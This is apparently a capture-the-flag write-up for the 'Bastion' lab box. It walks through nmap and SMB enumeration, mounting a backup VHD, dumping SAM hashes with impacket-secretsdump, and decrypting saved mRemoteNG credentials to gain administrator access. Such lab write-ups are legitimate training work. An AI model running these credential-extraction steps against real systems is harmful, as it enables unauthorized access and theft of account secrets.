# Box: Bastion

> Damiano Gubiani | 5/1/2026

export box ip

```bash
export IP='10.129.136.29'
```

# Enumerating

## NMAP

running nmap scan for open ports

command

```bash
sudo nmap -sSCV -oN nmap/fst -T4 -vv --min-rate 10000 $IP
```

output

```
Nmap scan report for 10.129.136.29
Host is up, received echo-reply ttl 127 (0.026s latency).
Scanned at 2026-04-30 19:16:23 EDT for 16s
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE      REASON          VERSION
22/tcp   open  ssh          syn-ack ttl 127 OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3bG3TRRwV6dlU1lPbviOW+3fBC7wab+KSQ0Gyhvf9Z1OxFh9v5e6GP4rt5Ss76ic1oAJPIDvQwGlKdeUEnjtEtQXB/78Ptw6IPPPPwF5dI1W4GvoGR4MV5Q6CPpJ6HLIJdvAcn3isTCZgoJT69xRK0ymPnqUqaB+/ptC4xvHmW9ptHdYjDOFLlwxg17e7Sy0CA67PW/nXu7+OKaIOx0lLn8QPEcyrYVCWAqVcUsgNNAjR4h1G7tYLVg3SGrbSmIcxlhSMexIFIVfR37LFlNIYc6Pa58lj2MSQLusIzRoQxaXO4YSp/dM1tk7CN2cKx1PTd9VVSDH+/Nq0HCXPiYh3
|   256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBF1Mau7cS9INLBOXVd4TXFX/02+0gYbMoFzIayeYeEOAcFQrAXa1nxhHjhfpHXWEj2u0Z/hfPBzOLBGi/ngFRUg=
|   256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB34X2ZgGpYNXYb+KLFENmf0P0iQ22Q0sjws2ATjFsiN
135/tcp  open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

i started by enumerating the smb shares with the following command

```bash
nxc smb $IP -u 'guest' -p '' --shares 
```

output

![](Screen/Pasted%20image%2020260501012441.png)

## SMB

after connecting to the share theres a note.txt file that i downloaded to read its content

so first we connect to the share

```bash
smbclient -N \\\\$IP\\Backups
```

than we download the file with the following command

```
megt note.txt
```

and the content reads the following

```
Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

from this we understand that thers a backup of an entire disk wich means we can probably extract the sam hashes to connect to the machine

in fact after searching around we found the directory with the .vhd file wich is a disk file

![](Screen/Pasted%20image%2020260501014134.png)

i searched online how to mount this type of file to read its content and i stumble upon a medium post that explain how to mount said file

link

> https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25

so first we need to install the guestmount tool

```bash
sudo apt-get install libguestfs-tools
```

after that we install the cifs util

```bash
sudo apt-get install cifs-utils
```

so for practicality we mount the share localy to our machine by creating a remote directory and mounting the share on it

```bash
cd /mnt/
sudo mkdir remote
```

than we connect the share to it

```bash
sudo mount -t cifs //10.129.136.29/Backups /mnt/remote -o rw
```

than we use the guestmount tool to mount the .vhd file

```bash
sudo guestmount --add /mnt/remote/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v 
```

and after that we can access the vhd file

![](Screen/Pasted%20image%2020260501015900.png)

## impacket-secretsdump

after getting in the file system i went to the windows sam file location

> C:\Windows\System32\config

so i went there and copied the sam, system and security file

![](Screen/Pasted%20image%2020260501020613.png)

and i ran secrets dump on them to extract the hashes

command

```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM local
```

output

![](Screen/Pasted%20image%2020260501020702.png)

this credentials in plaintext works in the SSH login

![](Screen/Pasted%20image%2020260501022122.png)

# LPE

now we need to escalete our privilege to system, checking around we found an unusual application in the program file folder wich is mRemoteNG

![](Screen/Pasted%20image%2020260501022339.png)

checking the configuration for the file we found where's log are stored

![](Screen/Pasted%20image%2020260501022703.png)

and in the following path we found where credentials are stored

> C:\Users\L4mpje\AppData\Roaming\mRemoteNG

checking one .backup file we can see some encrypted credentials

![](Screen/Pasted%20image%2020260501023105.png)

as we see there's the administrator encrypted password, searching online i found a decryptor to use to found the plain text password

link

> https://github.com/kmahyyg/mremoteng-decrypt

and after using the program we got credentials

![](Screen/Pasted%20image%2020260501023438.png)

and after trying the credentials we are admin to the machine

![](Screen/Pasted%20image%2020260501023547.png)



